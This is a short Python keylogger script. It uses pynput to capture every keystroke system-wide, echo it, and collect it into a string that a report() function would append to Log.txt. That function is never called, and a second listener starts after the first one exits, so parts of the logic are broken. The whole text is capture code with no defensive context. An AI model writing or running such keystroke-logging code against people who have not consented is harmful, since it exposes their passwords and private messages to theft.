from pynput import keyboard 
import threading as th 
import os

path = os.path.join(os.getcwd(), "Log.txt")

def report():
    global log, path
    logfile = open (path, "a")
    logfile.write(log)
    logfile.close()

log = ""

def processkeys(key):
    global log 
    try:
        if key == (keyboard. Key .space):
            print(" ")
            log += " " 
        elif key == (keyboard.Key.enter):
            print("\n")
            log += "\n"
        elif key == (keyboard. Key.backspace):
            print("BS")
            log = log[:-1]
        else:
            print (key.char, end ="") 
            log += key.char
    except AttributeError:
        print(key, end =" ")
        log += str (key)

def on_press (key):
    processkeys (key)

def on_release (key):
    if key == keyboard. Key.esc:
        return False

with keyboard.Listener(
    on_press=on_press,
    on_release=on_release) as listener:
    listener.join()

keyboard_listener = keyboard.Listener(on_press=processkeys)

with keyboard_listener: keyboard_listener.join()